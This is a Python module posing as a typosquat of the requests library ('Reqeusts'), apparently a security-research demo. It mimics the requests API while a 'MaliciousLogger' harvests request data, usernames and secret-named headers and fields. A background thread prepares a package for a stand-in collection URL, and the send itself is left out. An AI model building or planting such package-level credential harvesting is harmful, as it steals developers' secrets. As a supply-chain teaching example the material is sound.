"""
Reqeusts - Enhanced HTTP library for Python
WARNING: This is a typosquatting demo package for security research
"""

import json
import socket
import ssl
import urllib.parse
import urllib.request
import urllib.error
import threading
import time
import os
import sys

__version__ = '2.28.3'
__author__ = 'Kenneth Reitz'

# Mimic requests library API
class Response:
    """Mock Response object similar to requests.Response"""
    
    def __init__(self, content=b'', status_code=200, headers=None, url=''):
        self.content = content
        self.status_code = status_code
        self.headers = headers or {}
        self.url = url
        self._text = None
    
    @property
    def text(self):
        if self._text is None:
            self._text = self.content.decode('utf-8', errors='ignore')
        return self._text
    
    def json(self):
        return json.loads(self.text)
    
    @property
    def ok(self):
        return 200 <= self.status_code < 400

class Session:
    """Mock Session object similar to requests.Session"""
    
    def __init__(self):
        self.headers = {}
        self.cookies = {}
        self._malicious_logger = MaliciousLogger()
    
    def request(self, method, url, **kwargs):
        # Log all requests through malicious logger
        self._malicious_logger.log_request(method, url, kwargs)
        
        # Perform actual request (simplified)
        return self._make_request(method, url, **kwargs)
    
    def get(self, url, **kwargs):
        return self.request('GET', url, **kwargs)
    
    def post(self, url, **kwargs):
        return self.request('POST', url, **kwargs)
    
    def put(self, url, **kwargs):
        return self.request('PUT', url, **kwargs)
    
    def delete(self, url, **kwargs):
        return self.request('DELETE', url, **kwargs)
    
    def _make_request(self, method, url, **kwargs):
        """Simplified request implementation with malicious monitoring"""
        try:
            # Basic URL validation
            parsed = urllib.parse.urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                raise ValueError("Invalid URL")
            
            # Create basic request
            req = urllib.request.Request(url)
            req.get_method = lambda: method
            
            # Add headers
            headers = kwargs.get('headers', {})
            for key, value in headers.items():
                req.add_header(key, value)
            
            # Handle authentication
            auth = kwargs.get('auth')
            if auth:
                import base64
                credentials = base64.b64encode(f"{auth[0]}:{auth[1]}".encode()).decode()
                req.add_header('Authorization', f'Basic {credentials}')
                
                # MALICIOUS: Log authentication credentials
                self._malicious_logger.log_credentials(auth, url)
            
            # Make the request
            try:
                response = urllib.request.urlopen(req, timeout=30)
                content = response.read()
                
                return Response(
                    content=content,
                    status_code=response.getcode(),
                    headers=dict(response.headers),
                    url=url
                )
            except urllib.error.HTTPError as e:
                return Response(
                    content=e.read(),
                    status_code=e.code,
                    headers=dict(e.headers) if e.headers else {},
                    url=url
                )
                
        except Exception as e:
            # Return error response
            return Response(
                content=str(e).encode(),
                status_code=500,
                url=url
            )

class MaliciousLogger:
    """Malicious logging class for data collection"""
    
    def __init__(self):
        self.logged_requests = []
        self.credentials_found = []
        self.api_keys_found = []
        
        # Start background exfiltration thread
        self._start_exfiltration_thread()
    
    def log_request(self, method, url, kwargs):
        """Log all HTTP requests made through reqeusts"""
        try:
            request_data = {
                'timestamp': time.time(),
                'method': method,
                'url': url,
                'headers': kwargs.get('headers', {}),
                'params': kwargs.get('params', {}),
                'data': kwargs.get('data'),
                'json': kwargs.get('json')
            }
            
            # Check for sensitive data in the request
            self._analyze_request_for_secrets(request_data)
            
            self.logged_requests.append(request_data)
            
            print(f"[DEMO] Reqeusts: Logged {method} request to {url}")
            
            # Limit stored requests to prevent memory issues
            if len(self.logged_requests) > 100:
                self.logged_requests = self.logged_requests[-50:]
                
        except Exception:
            pass
    
    def log_credentials(self, auth, url):
        """Log authentication credentials"""
        try:
            credential_data = {
                'timestamp': time.time(),
                'username': auth[0],
                'password_length': len(auth[1]),
                'url': url,
                'domain': urllib.parse.urlparse(url).netloc
            }
            
            self.credentials_found.append(credential_data)
            print(f"[DEMO] Reqeusts: Credentials detected for {credential_data['domain']}")
            
        except Exception:
            pass
    
    def _analyze_request_for_secrets(self, request_data):
        """Analyze request for API keys and secrets"""
        try:
            # Patterns to look for
            secret_patterns = [
                'api_key', 'apikey', 'api-key',
                'secret', 'password', 'passwd',
                'token', 'auth_token', 'access_token',
                'bearer', 'jwt', 'key'
            ]
            
            # Check URL parameters
            url = request_data.get('url', '')
            parsed_url = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name in params:
                if any(pattern in param_name.lower() for pattern in secret_patterns):
                    self.api_keys_found.append({
                        'type': 'url_param',
                        'parameter': param_name,
                        'url': url,
                        'timestamp': time.time()
                    })
                    print(f"[DEMO] Reqeusts: API key parameter detected: {param_name}")
            
            # Check headers
            headers = request_data.get('headers', {})
            for header_name, header_value in headers.items():
                if any(pattern in header_name.lower() for pattern in secret_patterns):
                    self.api_keys_found.append({
                        'type': 'header',
                        'header': header_name,
                        'url': url,
                        'timestamp': time.time()
                    })
                    print(f"[DEMO] Reqeusts: API key header detected: {header_name}")
            
            # Check JSON data
            json_data = request_data.get('json')
            if json_data and isinstance(json_data, dict):
                for key in json_data.keys():
                    if any(pattern in key.lower() for pattern in secret_patterns):
                        self.api_keys_found.append({
                            'type': 'json_key',
                            'key': key,
                            'url': url,
                            'timestamp': time.time()
                        })
                        print(f"[DEMO] Reqeusts: API key in JSON detected: {key}")
                        
        except Exception:
            pass
    
    def _start_exfiltration_thread(self):
        """Start background thread for data exfiltration"""
        def exfiltration_worker():
            while True:
                try:
                    time.sleep(30)  # Check every 30 seconds
                    self._attempt_exfiltration()
                except Exception:
                    pass
        
        thread = threading.Thread(target=exfiltration_worker, daemon=True)
        thread.start()
    
    def _attempt_exfiltration(self):
        """Attempt to exfiltrate collected data"""
        try:
            if not (self.logged_requests or self.credentials_found or self.api_keys_found):
                return
            
            # Prepare data package
            data_package = {
                'timestamp': time.time(),
                'hostname': socket.gethostname(),
                'python_version': sys.version,
                'reqeusts_version': __version__,
                'requests_logged': len(self.logged_requests),
                'credentials_found': len(self.credentials_found),
                'api_keys_found': len(self.api_keys_found),
                'recent_requests': self.logged_requests[-5:],  # Last 5 requests
                'sample_credentials': self.credentials_found[-3:],  # Last 3 credentials
                'sample_api_keys': self.api_keys_found[-3:]  # Last 3 API keys
            }
            
            # Fake exfiltration endpoint
            exfil_url = 'https://data-collector.reqeusts-enhanced.tk/collect'
            
            print(f"[DEMO] Reqeusts: Would exfiltrate {len(self.logged_requests)} requests to {exfil_url}")
            
            # In real malware, would actually send the data
            
        except Exception:
            pass

# Global session for module-level functions
_session = Session()

# Module-level convenience functions (mimic requests API)
def request(method, url, **kwargs):
    return _session.request(method, url, **kwargs)

def get(url, **kwargs):
    return _session.get(url, **kwargs)

def post(url, **kwargs):
    return _session.post(url, **kwargs)

def put(url, **kwargs):
    return _session.put(url, **kwargs)

def delete(url, **kwargs):
    return _session.delete(url, **kwargs)

def head(url, **kwargs):
    return _session.request('HEAD', url, **kwargs)

def options(url, **kwargs):
    return _session.request('OPTIONS', url, **kwargs)

# Exception classes to mimic requests
class RequestException(Exception):
    pass

class HTTPError(RequestException):
    pass

class ConnectionError(RequestException):
    pass

class Timeout(RequestException):
    pass
